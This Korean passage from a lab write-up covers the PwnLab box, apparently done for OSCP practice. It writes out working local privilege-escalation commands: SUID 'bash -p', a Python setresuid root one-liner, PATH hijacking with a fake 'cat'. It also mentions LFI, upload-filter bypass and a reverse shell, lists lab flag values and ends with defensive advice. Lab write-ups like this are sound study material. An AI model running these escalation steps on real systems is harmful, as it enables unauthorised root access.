이건 이 박스에서 관측한 게 아니라 Kali 에서 따로 확인한 것이다. SUID root 인 C 프로그램이 `execl("/bin/bash","bash",...)` 하도록 만들어 두 경우를 재봤다.

```
┌──(kali㉿kali)-[~]
└─$ gcc -o ~/suidtest/a ~/suidtest/a.c && sudo chown root:root ~/suidtest/a && sudo chmod 4755 ~/suidtest/a
└─$ ~/suidtest/a          # execl("/bin/bash","bash","-c","id -u; id -u -r; echo EUID=$EUID UID=$UID")
1000
1000
EUID=1000 UID=1000
└─$ ~/suidtest/b          # 같은 코드에 "-p" 만 추가
0
1000
EUID=0 UID=1000
```

곁다리로 얻은 것 하나 — 처음에 이 테스트를 `/tmp` 에서 했더니 `-p` 를 줘도 EUID 가 1000 이었다. Kali 의 `/tmp` 가 `nosuid` 라서다(`findmnt -no OPTIONS /tmp` → `rw,nosuid,nodev,...`). **SUID 실험은 `/tmp` 에서 하지 마라.**

euid 만 root 인 상태는 불편하므로(파일 소유·`su` 등에서 걸린다) 완전한 root 로 만든다.

```
bash-4.3# python -c "import os;os.setresuid(0,0,0);os.setresgid(0,0,0);os.execl(\"/bin/bash\",\"bash\")"
root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; ls -la /root; cat /root/proof.txt
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:30 EDT 2026
total 24
drwx------  2 root root 4096 Aug 20 04:23 .
drwxr-xr-x 21 root root 4096 Feb 20  2020 ..
lrwxrwxrwx  1 root root    9 Mar 17  2016 .bash_history -> /dev/null
-rw-r--r--  1 root root  570 Jan 31  2010 .bashrc
----------  1 root root   32 Jul 13  2020 flag.txt
lrwxrwxrwx  1 root root    9 Mar 17  2016 messages.txt -> /dev/null
lrwxrwxrwx  1 root root    9 Mar 17  2016 .mysql_history -> /dev/null
-rw-r--r--  1 root root  140 Nov 19  2007 .profile
-rw-r--r--  1 root root   33 Aug 20 04:23 proof.txt
```

프롬프트가 `bash-4.3#` 에서 `root@pwnlab:/tmp#` 으로 바뀌고 `uid=0` 이 찍힌다. `ls -la /root` 가 여기서 세 가지를 한꺼번에 알려준다 — `flag.txt` 는 모드 `----------`(000) 의 미끼, `proof.txt` 가 진짜, 그리고 `messages.txt`·`.bash_history`·`.mysql_history` 가 전부 `/dev/null` 심볼릭 링크라 **방금 `msg2root` 로 넣은 `hi` 도 root 의 히스토리도 아무 데도 안 남는다.**

그런데 마지막 `cat /root/proof.txt` 의 출력이 없다. 원인은 6장 (4)에 있다.

### 다른 경로였다면

`msg2root` 를 못 찾았다면 다음 후보는 SUID `/usr/sbin/exim4` 였다. 다만 root 를 잡은 뒤 버전을 재보니 이미 패치된 쪽이었다.

```
root@pwnlab:/tmp# dpkg -l exim4-daemon-light exim4-base | tail -2; exim4 --version | head -2
ii  exim4-base         4.84.2-1     i386         support files for all Exim MTA (v4) packages
ii  exim4-daemon-light 4.84.2-1     i386         lightweight Exim MTA (v4) daemon
Exim version 4.84_2 #2 built 13-Mar-2016 22:18:29
```

`4.84.2` 는 Debian 이 로컬 권한상승 수정을 백포트해 넣은 버전이라 그쪽 경로는 아니었을 것으로 본다 `[가정]` — 실제로 익스플로잇을 시도해보지는 않았다. 그 다음 후보는 커널 3.16(2016년 빌드) 로컬 익스플로잇이었을 것이다.

## 5. 플래그

두 개 다 표준 위치다. **2026-08-20 인스턴스 값**이고, PG 는 박스를 다시 켜면 새로 만든다.

| | 경로 | 값 |
|---|---|---|
| user | `/home/kane/local.txt` | `e7fb032dc3da97822fc7dc2d65ffcc18` |
| root | `/root/proof.txt` | `540256bedfbf87d15d54425649220e30` |

`/root/flag.txt` 는 미끼다 — 모드 `----------`(000)에 내용은 `Your flag is in another file...` 이다. 원본 VulnHub 판의 흔적으로 보인다.

user 플래그 획득 시점(kane 셸):

```
whoami; id; hostname; hostname -I; date; cat /home/kane/local.txt
<d; hostname; hostname -I; date; cat /home/kane/local.txt
kane
uid=1003(kane) gid=1003(kane) groups=1003(kane)
pwnlab
192.168.248.29
Thu Aug 20 04:42:55 EDT 2026
e7fb032dc3da97822fc7dc2d65ffcc18
```

두 번째 줄의 `<d; hostname...` 은 명령이 아니라, `tmux send-keys` 로 셸을 몰 때 pty 에코가 터미널 폭에서 접혀 생긴 잔상이다. 이후 `stty cols 200` 으로 폭을 넓혀 잔상을 없앴다.

root 시점:

```
whoami; id; hostname; hostname -I; date; cat /root/proof.txt; cat /home/kane/local.txt
whoami; id; hostname; hostname -I; date; cat /root/proof.txt; cat /home/kane/local.txt
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29
Thu Aug 20 04:52:41 EDT 2026
540256bedfbf87d15d54425649220e30
e7fb032dc3da97822fc7dc2d65ffcc18
```

타겟은 EDT(UTC-4), Kali 는 KST(UTC+9)라 산출물 mtime 과 13시간 차이가 난다. 자기모순이 아니다.

## 6. 막혔던 지점 / 시행착오

전체 소요는 정찰 시작 17:37 → root 17:45(KST), 약 8분이었다. 그런데도 걸린 데가 넷 있었고 전부 **타겟이 아니라 도구/셸 쪽**이었다. 타겟 쪽에서 위험했던 건 (5) 하나인데, 그건 **시간을 안 태우고 지나갔다는 점에서** 오히려 더 위험한 종류다.

**(1) `nnmap` 별칭이 tmux 안에서 안 먹는다** — `try2_nnmap_alias_notfound.log`

`ssh kali "tmux new-session -d -s pwnlab_nmap 'cd ~/PG/PwnLab && nnmap 192.168.248.29 ...'"` 로 스캔을 걸어놓고 다른 일을 하다가, 10분 뒤 결과를 보러 갔더니 pane 에 이게 있었다.

```
zsh:1: command not found: nnmap
┌──(kali㉿kali)-[~/PG/PwnLab]
└─$
```

`nnmap` 은 `~/.zshrc` 의 별칭인데, tmux 가 명령 문자열을 실행할 때는 그 초기화 파일이 안 읽힌다. **스캔이 0초 만에 끝나 있었고 나는 그걸 "돌고 있는 중"으로 착각했다.** 결국 `-p-` 결과는 17:47 에야 나왔다(다행히 침투는 quick 스캔으로 이미 진행 중이었다). 교훈은 두 개다 — 별칭은 tmux 안에서 전개해서 쓸 것, 그리고 **백그라운드에 던진 작업은 "돌고 있겠지" 대신 pane 을 한 번 볼 것.**

**(2) MySQL 클라이언트가 SSL 로 죽는다** — `try3_mysql_ssl.log`

```
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

Kali 의 MariaDB 클라이언트는 요즘 기본이 TLS 요구다. MySQL 5.5 는 그걸 못 한다. 반사적으로 `--ssl-mode=DISABLED` 를 쳤는데 그건 **Oracle MySQL 클라이언트 옵션**이라 MariaDB 에서는 이렇게 죽는다.

```
mysql: unknown variable 'ssl-mode=DISABLED'
```

MariaDB 쪽 이름은 `--skip-ssl` 이다. 낡은 DB 를 만나면 클라이언트 계열부터 확인하는 게 빠르다.

같은 파일에 하나 더 남았다. 나중에 로그를 재현하려고 실패 명령을 반복했더니 서버가 우리 IP 를 차단했다.

```
ERROR 2002 (HY000): Received error packet before completion of TLS handshake. The authenticity of the following error cannot be verified: 1129 - Host '192.168.45.207' is blocked because of many connection errors; unblock with 'mysqladmin flush-hosts'
```

MySQL 의 `max_connect_errors` 다. **핸드셰이크 실패도 카운트에 들어간다.** 시험장에서 DB 에 크리덴셜을 여러 개 시도할 때 이걸 모르면 "비밀번호가 다 틀렸다"고 오판하게 된다. 차단되면 에러 메시지 자체가 바뀌니 문구를 구분해서 읽어야 한다.

**(3) bash 히스토리 확장이 `#!` 를 먹는다** — `try1_msgmike_histexpand.log`

가짜 `cat` 을 만들려고 이렇게 쳤다.

```
mkdir -p /tmp/.pth && printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat && chmod +x /tmp/.pth/cat && PATH=/tmp/.pth:$PATH /home/kane/msgmike
bash: !/bin/bash\nexec: event not found
```

큰따옴표 안의 `!` 가 히스토리 확장으로 해석된다. 문제는 그 다음이다 — **`&&` 로 이어붙여 놨기 때문에 줄 전체가 폐기돼 `mkdir` 조차 실행되지 않았다.**

그래서 따옴표를 갈라 `!` 를 확장에서 떼어내는 우회를 먼저 시도했는데, 이번엔 다른 에러가 셋 나왔다.

```
kane@pwnlab:/tmp$ printf '%s\n' '#''!/bin/bash' 'exec /bin/bash -p' > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
bash: /tmp/.pth/cat: No such file or directory
chmod: cannot access ‘/tmp/.pth/cat’: No such file or directory
cat: /tmp/.pth/cat: No such file or directory
```

**따옴표 우회 자체는 통했다**(`event not found` 가 안 난다). 실패한 이유는 앞 줄에서 `mkdir` 이 안 돌아 `/tmp/.pth` 가 없기 때문이다. 여기서 잠깐 "따옴표 우회도 안 되나" 하고 엉뚱한 데를 팠다. **에러 문구가 바뀌었으면 원인도 바뀐 것**이라고 읽었어야 했다.

`set +H` 를 같은 줄 앞에 붙이는 것도 안 된다.

```
kane@pwnlab:/tmp$ set +H; mkdir -p /tmp/.pth; printf "#!/bin/bash\nexec /bin/bash -p\n" > /tmp/.pth/cat; chmod +x /tmp/.pth/cat; cat /tmp/.pth/cat
bash: !/bin/bash\nexec: event not found
```

히스토리 확장은 **줄을 읽는 시점**에 일어나므로 같은 줄의 `set +H` 는 이미 늦다. 별도 줄로 먼저 보내니 통했다(4-3의 블록). 홑따옴표로 감싸도 되지만, 셸을 `send-keys` 로 원격 조종하는 상황에서는 따옴표가 여러 겹 중첩되니 `set +H` 한 줄이 더 깔끔하다.

곁다리 교훈 하나 — 이 세 번의 실패는 전부 **`&&`/`;` 로 길게 이어붙인 한 줄** 때문에 원인 파악이 늦어졌다. 파일을 만들고 실행하는 단계는 끊어서 치는 편이 결국 빠르다.

**(4) 가짜 `cat` 이 root 셸까지 따라와 플래그를 삼켰다** — `try4_fakecat_shadowed_PATH.log`

root 를 잡고 나서 증거 형식대로 쳤는데 플래그가 안 나왔다.

```
root@pwnlab:/tmp# whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:44 EDT 2026
root@pwnlab:/tmp# 
```

플래그도 안 나오지만 **`---` 도 안 찍혔다.** 이게 결정적 단서다 — `echo` 는 bash 내장이라 PATH 와 무관하게 항상 동작해야 한다. 그게 안 나왔다는 건 `cat /root/proof.txt` 에서 **줄 전체가 끊긴 것**이지 `cat` 이 조용히 실패한 게 아니다. 직전 실행(4-4)에서 `ls -la /root` 는 `-rw-r--r-- 1 root root 33 proof.txt` 를 멀쩡히 보여줬으니 파일 문제도 아니다.

원인은 PATH 였다. 확인과 복원을 한 줄에 붙여 쳤다.

```
root@pwnlab:/tmp# echo "PATH=$PATH"; export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; whoami; id; hostname; hostname -I; date; cat /root/proof.txt; echo ---; cat /root/flag.txt
PATH=/tmp/.pth:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
root
uid=0(root) gid=0(root) groups=0(root),1003(kane)
pwnlab
192.168.248.29 
Thu Aug 20 04:45:59 EDT 2026
540256bedfbf87d15d54425649220e30
---
Your flag is in another file...
```

`PATH=/tmp/.pth:$PATH /home/kane/msgmike` 로 넘긴 환경변수가 **mike 셸 → msg2root → root 셸까지 3단계를 그대로 상속**했다. 그래서 `cat` 은 우리가 만든 가짜 `cat` 으로 해석됐고, 그 내용이 `exec /bin/bash -p` 다. `exec` 는 프로세스를 통째로 갈아치우므로 **그 줄의 나머지(`echo ---; cat /root/flag.txt`)를 파싱해 들고 있던 셸이 사라진다.** 새로 뜬 bash 가 프롬프트를 다시 그리고, 겉보기엔 "cat 이 아무것도 안 하고 돌아온" 것처럼 보인다.

`/root/flag.txt` 가 여기서 처음 읽힌다 — 모드 000 이지만 root 라서 읽을 수 있고, 내용은 미끼다.

> [!tip] PATH 하이재킹으로 셸을 얻었으면 그 즉시 PATH 를 되돌려라
> 하이재킹용 디렉터리가 PATH 에 남아 있는 한 **모든 후속 명령이 오염된다.** 이 박스는 `cat` 하나였지만
> `ls`·`id` 를 덮어썼다면 열거 결과 전체를 못 믿게 된다. 증상이 "에러"가 아니라 **"조용한 무출력"** 이라
> 원인을 엉뚱한 데서 찾게 되는데, 명령을 `; echo ---` 로 이어 쳐두면 구분이 된다 —
> `---` 가 찍히면 그 명령만 실패한 것이고, **안 찍히면 줄 자체가 끊긴 것**이다.

**(5) www-data 로 돌린 SUID 열거를 결론으로 믿을 뻔했다** — `harvest_www-data.txt` vs `harvest_root.txt`

두 파일의 `===== SUID =====` 섹션을 나란히 놓으면 차이가 두 줄이다.

```
$ diff <(sed -n '/===== SUID/,/^===== SGID/p' harvest_www-data.txt) \
       <(sed -n '/===== SUID/,/^===== SGID/p' harvest_root.txt)
> /home/mike/msg2root
> /home/kane/msgmike
```

www-data 시점 목록은 배포판 기본 15개뿐이라 "커스텀 SUID 없음"으로 읽힌다. 그런데 이 박스의 권한상승 경로는 **그 빠진 두 줄이 전부**였다. `/home/*` 이 `drwxr-x---` 라 `find` 가 못 들어갔고, `Permission denied` 는 `2>/dev/null` 로 버려져 **에러조차 안 남는다.** 침묵이 곧 "없음"으로 보이는 형태라 시험장에서 사람을 통째로 헛다리 짚게 만든다. 4-1의 경고와 같은 이야기고, 재현은 위 `diff` 한 줄이면 된다.

**막다른 길로 접은 것들**

- **kent 계정** — DB 비밀번호가 통해서 로그인은 됐지만 홈이 완전히 비어 있었다. 세 계정 중 kane 만 의미가 있었다.
- **`john` 사용자** — `/home/john` 이 존재하고 셸도 `/bin/bash` 인데, root 로 들어가 보니 dotfile 만 있고 완전히 비어 있다. DB `users` 테이블에도 없다. PG 가 추가한 장식으로 보인다 `[가정]`.
- **NFS** — `mount.nfs` 가 SUID 이고 111/rpcbind 가 열려 있어 잠깐 봤지만 `/etc/exports` 가 비어 있고 2049 도 안 열려 있다.
- **login.php SQLi** — 소스를 읽어보니 prepared statement 라 시도조차 안 했다. **소스를 먼저 읽은 것이 여기서 시간을 벌었다.**

## 7. OSCP 시험 관점

1. **LFI 진입점을 하나 찾았다고 멈추지 마라.** 이 박스는 `?page=`(확장자 강제 → 소스 읽기 전용)와 `Cookie: lang=`(확장자 없음 → 실행 가능)이 따로 있었고, **후자는 첫 번째로 읽어낸 소스 안에 적혀 있었다.** 소스를 뽑았으면 include/require 를 전부 훑어라.
2. **`php://filter` 로 소스를 읽을 때 확장자를 붙일지 말지는 그 코드가 결정한다.** `include($_GET['page'].".php")` 면 `resource=config`, 그냥 `include($_GET['page'])` 면 `resource=config.php`. 한 번 틀리면 빈 결과가 나오는데 원인 파악이 오래 걸린다.
3. **업로드 필터는 항목별로 갈라서 뚫어라.** 파일명 · Content-Type · 매직바이트는 서로 다른 곳을 보므로 각각 따로 만족시키면 된다. 자동 도구 없이 `printf` + `curl -F ...;type=` 로 끝난다.
4. **DB 의 비밀번호는 OS 계정에도 넣어봐라.** base64 는 해시가 아니다. 크랙 도구가 필요 없다.
5. **`sudo` 가 없는 박스가 있다.** `sudo -l` 이 `command not found` 면 그건 실패가 아니라 결론이다.
6. **커스텀 SUID 가 안 보이면 열거를 다시 할 권한이 부족한 것일 수 있다.** `find / -perm -4000` 은 접근 가능한 디렉터리만 본다. **사용자 계정을 얻을 때마다 SUID·크론·`getcap` 을 다시 돌려라.** 이 박스는 그것 하나로 갈렸다.
7. **`strings <SUID바이너리>` 는 3초짜리 반사다.** 상대경로 명령(`cat`, `ls`) → PATH 하이재킹. `system("... %s ...")` → 인젝션. 둘 다 아니면 `ltrace`/`strace`.
8. **PATH 하이재킹 후에는 PATH 를 즉시 복원한다**(6장 (4)).
9. **시간 배분** — 웹 소스를 읽는 데 쓴 1분이 SQLi 시도 20분을 아꼈다. 반대로 tmux 에 던져놓은 nmap 을 확인 안 한 10분은 순손실이었다. **백그라운드 작업은 던진 직후와 몇 분 뒤 두 번 확인하라.**
10. **Metasploit 을 쓰지 않았다.** 전 과정이 `curl`·`mysql`·`nc`·`strings` 로 끝나므로 1대 한정 카드를 아낄 수 있다.

## 8. 방어 관점

- `include` 에 사용자 입력을 넣지 않는다. 언어 파일처럼 값이 유한하면 화이트리스트 배열로 매핑한다(`$langs = ['en'=>'en.lang.php']`). 경로 정규화(`realpath` + prefix 검사)는 차선책이다.
- 업로드 파일을 **웹 서버가 읽는 경로 밖**에 저장하고, 제공은 스크립트를 통해 한다. 확장자·MIME 검사는 보조 수단이지 방어선이 아니다 — 여기서는 세 겹이 다 통과됐다.
- 비밀번호를 base64 로 저장하지 않는다. `password_hash()`(bcrypt) 를 쓴다. 그리고 DB 계정과 OS 계정의 비밀번호를 공유하지 않는다.
- SUID 바이너리에서 `system()`/`popen()` 을 쓰지 않는다. 불가피하면 절대경로 + `execve` 로 인자 배열을 넘기고, PATH·IFS 등 환경변수를 초기화한다.
- MySQL 을 `0.0.0.0:3306` 에 바인딩하지 않는다. 이 박스는 웹앱이 `localhost` 로만 접속하므로 `bind-address=127.0.0.1` 이면 충분했고, 그랬다면 Kali 에서 DB 를 직접 덤프할 수 없었다.

## 9. 참고 자료

- `php://filter` 래퍼 — PHP 매뉴얼 `filters.convert.base64-encode`
- GTFOBins — PATH 하이재킹 일반론 및 `bash -p` 동작
- 산출물 전량: Kali `~/PG/PwnLab/`

## 남긴 흔적

확인한 것:

- **업로드 파일** `/tmp/63f0276ffd69eb424bf6093795ac9850.gif` (= `/var/www/html/upload/...`) — 삭제 확인
- **harvest 스크립트와 출력** `/tmp/h.sh`, `/tmp/.h/` — 삭제 확인
- **PATH 하이재킹 디렉터리** `/tmp/.pth/cat` — 삭제 확인
- **리버스셸 FIFO** `/tmp/f` — 삭제 확인
- **RFI 테스트 파일** `/tmp/rfitest.php` — 삭제 확인
- 최종 `/tmp` 는 부팅 시 상태(`.ICE-unix` 등 systemd 디렉터리 + `vmware-root`)만 남았고, `/var/www/html` 은 원본 6개 항목 그대로다. 소스 파일은 하나도 수정하지 않았다.

확인했지만 **지우지 않은 것** (지우는 것이 더 많은 흔적을 남긴다):

- `/var/log/auth.log` 에 su 체인이 그대로 남았다.
  ```
  Aug 20 04:42:19 pwnlab su[1553]: + /dev/pts/0 www-data:kent
  Aug 20 04:42:19 pwnlab su[1553]: pam_unix(su:session): session opened for user kent by (uid=33)
  Aug 20 04:42:40 pwnlab su[1561]: Successful su for kane by kent
  Aug 20 04:42:40 pwnlab su[1561]: + /dev/pts/0 kent:kane
  Aug 20 04:42:40 pwnlab su[1561]: pam_unix(su:session): session opened for user kane by (uid=1001)
  ```
- `/var/log/apache2/access.log` 에 192.168.45.207 발 요청이 `grep -c` 로 **58건**(LFI·업로드·리버스셸 트리거·nmap NSE 의 OPTIONS/POST 포함).
- `/root/messages.txt` 는 `/dev/null` 심볼릭 링크라 `msg2root` 로 넣은 `hi` 는 아무 데도 안 남았다(4-4의 `ls -la /root` 참고).
- `wtmp` 에는 우리 흔적이 없다 — `last -n 5` 는 2020년 콘솔 로그인과 2024년 부팅만 보여준다. `su` 는 wtmp 에 기록하지 않고, SSH 로그인을 한 적도 없다. **그러니 `last` 만 보고 "흔적 없음"으로 결론 내면 틀린다** — 같은 시각 `auth.log` 에는 su 체인이 전부 남아 있다. 어느 로그를 보느냐로 결론이 갈린다.
- `.bash_history` 는 root/mike/john 것이 원래 `/dev/null` 링크이거나 0바이트고, kent/kane 것도 0바이트다. 비대화형이라 새로 쓰이지 않았다.

확인하지 않은 것: MySQL 서버 로그(일반 쿼리 로그가 켜져 있는지 보지 않았다), `/var/log/syslog`.

Kali 쪽: tmux `pwnlab_nmap`·`pwnlab_http`·`pwnlab_xfer`·`pwnlab_xfer2`·`ct` 종료, 8000/4445/4446/9099 리스너 정리 확인. 임시로 `~/PG/_lib/` 에 뒀던 `rfitest.php`/`rfitest.txt` 삭제 — `_lib` 은 `harvest.sh` 와 백업 2개만 남았다. `harvest.sh` 자체는 **수정하지 않았다**(19섹션 전부 정상 동작했고, `HARVEST_PW` 가 `ENV` 섹션에 새지 않는 것도 확인했다). `bash -p` 검증용으로 만든 `~/suidtest/` 와 `/tmp/suidtest*`(root 소유 SUID)도 삭제 확인. root 셸을 담은 tmux `pwnlab_shell` 은 플래그 재확인용으로 남겨두었다.

## 관련 노트

- [[_WRITEUP-STANDARD]]
- 비밀번호 재사용 패턴 · SUID 상대경로 PATH 하이재킹은 다른 리눅스 박스에서도 반복된다
